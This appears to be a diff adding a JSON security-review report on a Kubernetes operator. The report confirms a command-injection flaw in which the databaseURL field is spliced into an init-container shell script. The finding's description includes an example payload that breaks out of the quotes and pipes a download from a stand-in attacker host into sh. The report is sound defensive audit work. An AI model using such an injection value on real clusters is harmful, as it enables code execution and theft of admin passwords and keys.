@@ -1,0 +1,23 @@
+{
+  "summary": "Reviewed the single finding about OS command injection via spec.databaseURL in the WarpgateInstance operator's init-container script. The data flow is confirmed exactly as cited: the user-controllable CR field inst.Spec.DatabaseURL (warpgateinstance_types.go:86) is interpolated unescaped into a shell string at warpgateinstance_controller.go:557 (`--database-url \"%s\"`), joined into initScript (line 611), and executed via Command []string{\"/bin/sh\", \"-c\", initScript} at line 776; the validating webhook only emits an informational warning (webhook.go:256-258) with no sanitization. A value using quote-breakout or $(...) / backtick command substitution (both evaluated inside double quotes) yields arbitrary command execution in the init container, which has ADMIN_PASSWORD and any SSH/TLS secrets mounted. The secondary YAML config sinks at lines 345 and 380 are also confirmed. Kept 1 finding, dropped 0. Note: spec.Image is also user-settable (resolveImage, line 181), so an actor able to create CRs may already have a code-exec path when the image is unconstrained; the injection still matters where image is pinned/allowlisted, so the finding stands at high severity.",
+  "coverage": [
+    "internal/controller/warpgateinstance_controller.go",
+    "api/v1alpha1/warpgateinstance_webhook.go",
+    "api/v1alpha1/warpgateinstance_types.go"
+  ],
+  "findings": [
+    {
+      "title": "OS command injection via spec.databaseURL in WarpgateInstance init-container script",
+      "category": "security",
+      "cwe": "CWE-78",
+      "severity": "high",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 556,
+      "line_end": 558,
+      "description": "WarpgateInstanceReconciler.buildDeployment assembles a shell script from CR spec fields and runs it as the init container's command via `Command: []string{\"/bin/sh\", \"-c\", initScript}` (line 776). The attacker-controlled field spec.databaseURL is concatenated into that script unsanitized at line 557: `setupCmd += fmt.Sprintf(\" --database-url \\\"%s\\\"\", inst.Spec.DatabaseURL)`. There is no validation of databaseURL in the admission webhook (api/v1alpha1/warpgateinstance_webhook.go only emits an informational warning for it, lines 256-258), and no shell-escaping. Any principal with RBAC to create or update a WarpgateInstance can set databaseURL to a value such as `sqlite:/data/db\"; wget http://attacker/x -O- | sh; echo \"` (or simply use `$(...)`/backticks, which the shell evaluates even inside the double quotes) to execute arbitrary commands inside the init container. That container runs the trusted Warpgate image with the admin password exposed as the ADMIN_PASSWORD environment variable (lines 778-786) and, when configured, the SSH host/client keys and TLS private key mounted into /data, so a successful injection allows reading those secrets and arbitrary code execution in the pod. The same unsanitized value is also written into the generated warpgate.yaml config at line 345 (and spec.externalHost at line 380 is written unquoted), which is a related config-injection sink. Note: spec.image is also user-controllable (resolveImage, line 181), so where the image is unconstrained an actor who can create the CR already has a code-execution path; the command injection remains significant in deployments that pin or allowlist the image while leaving databaseURL free.",
+      "evidence": "Source: inst.Spec.DatabaseURL (CR spec field, types.go:86, no webhook validation). Sink: line 557 `setupCmd += fmt.Sprintf(\" --database-url \\\"%s\\\"\", inst.Spec.DatabaseURL)` -> appended into scriptParts (line 567-575) -> `initScript := strings.Join(scriptParts, \"\\n\")` (line 611) -> `Command: []string{\"/bin/sh\", \"-c\", initScript}` (line 776). Webhook only warns: warpgateinstance_webhook.go:256-258. Secondary sinks: controller.go:345 `fmt.Fprintf(&b, \"database_url: \\\"%s\\\"\\n\", ...)` and controller.go:380 `external_host: %s` (unquoted YAML).",
+      "recommendation": "Do not interpolate CR string fields into a shell command. Pass databaseURL to warpgate as an explicit argv element instead of building a `/bin/sh -c` string (e.g. use Command/Args as a fixed argv list with the value as its own element so the shell never parses it), or set it via an environment variable referenced with single quotes/`$VAR` the same way ADMIN_PASSWORD is handled. If a shell is unavoidable, strictly validate databaseURL against an allowlisted URL scheme/format in the validating webhook and reject shell metacharacters."
+    }
+  ]
+}
